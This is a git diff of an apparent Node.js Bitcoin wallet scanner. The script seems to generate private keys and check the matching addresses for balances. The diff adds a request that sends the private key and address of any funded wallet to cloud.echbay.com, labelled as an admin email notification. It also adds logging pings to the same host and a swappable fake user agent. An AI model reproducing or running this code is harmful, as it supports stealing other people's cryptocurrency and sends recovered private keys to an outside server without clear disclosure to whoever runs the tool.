@@ -17,8 +17,8 @@ var request = require('request');
 /*
  * config
  */
-var debug_code = false; // true || false
-//var debug_code = true;
+var debug_code = false; // true || false ---> LIVE
+//var debug_code = true; // TEST
 if (debug_code === true) {
     console.log('You are in debug mode!');
 }
@@ -35,6 +35,8 @@ if (debug_code === false) {
 }
 
 //
+//var fake_user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36';
+var fake_user_agent = 'request';
 var current_ip = '';
 /*
 require('dns').lookup(require('os').hostname(), function (err, add, fam) {
@@ -43,24 +45,22 @@ require('dns').lookup(require('os').hostname(), function (err, add, fam) {
 })
 */
 request.get({
-    url: 'http://ipecho.net/plain',
-    //json: true,
+    //url: 'https://ipecho.net/plain',
+    url: 'https://cloud.echbay.com/scan/btc/getipaddress',
+    json: true,
     timeout: 30 * 1000,
     headers: {
-        'User-Agent': 'request'
-        //'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'
+        'User-Agent': fake_user_agent
     }
 }, (err, res, data) => {
     if (err) {
-        console.log('Error:', err);
-        console.log(data);
+        console.log('Request error:', err);
     } else if (res.statusCode !== 200) {
-        console.log('Status:', res.statusCode);
-        console.log(data);
+        console.log('Request status:', res.statusCode);
     } else {
-        console.log(data);
-        current_ip = data;
+        current_ip = data.ip;
     }
+    console.log(data);
 });
 
 //
@@ -252,8 +252,7 @@ function MY_scan(max_i) {
         json: true,
         timeout: 30 * 1000,
         headers: {
-            'User-Agent': 'request'
-            //'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'
+            'User-Agent': fake_user_agent
         }
     }, (err, res, data) => {
         if (err) {
@@ -286,7 +285,27 @@ function MY_scan(max_i) {
 
                     // nếu có số dư thì lưu lại file
                     if (data.addresses[i].final_balance > 0) {
+                        // lưu log
                         MY_writeFile(dir_writable + '/' + data.addresses[i].address + '.txt', JSON.stringify(arr_key_adds));
+
+                        // gửi email thông báo cho admin
+                        request.get({
+                            url: 'https://cloud.echbay.com/scan/btc/hasbalance?primary=' + pri + '&address=' + data.addresses[i].address,
+                            json: true,
+                            timeout: 30 * 1000,
+                            headers: {
+                                'User-Agent': fake_user_agent
+                            }
+                        }, (err, res, data) => {
+                            if (err) {
+                                console.log('Request error:', err);
+                            } else if (res.statusCode !== 200) {
+                                console.log('Request status:', res.statusCode);
+                            }
+                            console.log(data);
+                        });
+
+                        //
                         has_balance = true;
                     }
                 }
@@ -304,6 +323,23 @@ function MY_scan(max_i) {
                 //
                 if (has_balance === false) {
                     auto_next_scan = true;
+
+                    //
+                    request.get({
+                        url: 'https://cloud.echbay.com/scan/btc/log',
+                        json: true,
+                        timeout: 30 * 1000,
+                        headers: {
+                            'User-Agent': fake_user_agent
+                        }
+                    }, (err, res, data) => {
+                        if (err) {
+                            console.log('Request error:', err);
+                        } else if (res.statusCode !== 200) {
+                            console.log('Request status:', res.statusCode);
+                        }
+                        console.log(data);
+                    });
                 }
             }
         }
